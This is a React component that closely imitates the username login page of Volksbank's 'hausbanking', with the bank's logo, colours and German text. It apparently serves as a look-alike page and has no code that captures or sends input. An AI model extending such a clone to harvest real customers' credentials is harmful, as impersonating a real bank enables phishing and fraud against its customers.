import { useState } from "react";
import { X } from "lucide-react";
import volksbankLogo from "@/assets/volksbank-logo.png";
import volksbankBg from "@/assets/volksbank-bg.png";

const Volksbank = () => {
  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-3">
          <img src={volksbankLogo} alt="Volksbank" className="h-10 md:h-14" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-start justify-center py-10 px-4"
        style={{
          backgroundImage: `url(${volksbankBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[560px] shadow-lg rounded overflow-hidden">
          {/* Blue header bar */}
          <div
            className="px-6 py-4 text-white font-semibold text-lg"
            style={{ backgroundColor: "#196bc1" }}
          >
            hausbanking Login
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Info text */}
            <p className="text-sm" style={{ color: "#333" }}>
              Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre
              Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.
            </p>

            {/* Label row */}
            <div className="flex items-center justify-between">
              <span className="font-semibold text-xs" style={{ color: "#999" }}>
                Anmeldung mit Benutzername
              </span>
              <span className="text-sm space-x-2">
                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#196bc1" }}>
                  Barrierefrei
                </a>
                <span style={{ color: "#999" }}>|</span>
                <a href="#" onClick={(e) => e.preventDefault()} style={{ color: "#196bc1" }}>
                  English
                </a>
              </span>
            </div>

            {/* Username input */}
            <div className="relative">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors focus:ring-1 focus:ring-[#196bc1] focus:border-[#196bc1] focus:bg-[#d6e5f4]"
                style={{
                  backgroundColor: "#e8e8e8",
                  borderColor: "#999",
                }}
                placeholder=""
              />
              {username && (
                <button
                  onClick={() => setUsername("")}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  <X size={18} color="#196bc1" />
                </button>
              )}
            </div>

            {/* Terms text */}
            <p className="text-sm" style={{ color: "#333" }}>
              Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
            </p>

            {/* Weiter button */}
            <button
              className="w-full py-3 text-white font-semibold rounded text-sm"
              style={{ backgroundColor: "#196bc1" }}
            >
              Weiter
            </button>

            {/* Links */}
            <div className="flex flex-col items-center gap-1 pt-1">
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-sm no-underline hover:underline"
                style={{ color: "#196bc1" }}
              >
                Benutzername vergessen?
              </a>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-sm no-underline hover:underline"
                style={{ color: "#196bc1" }}
              >
                Passwort vergessen?
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Volksbank;
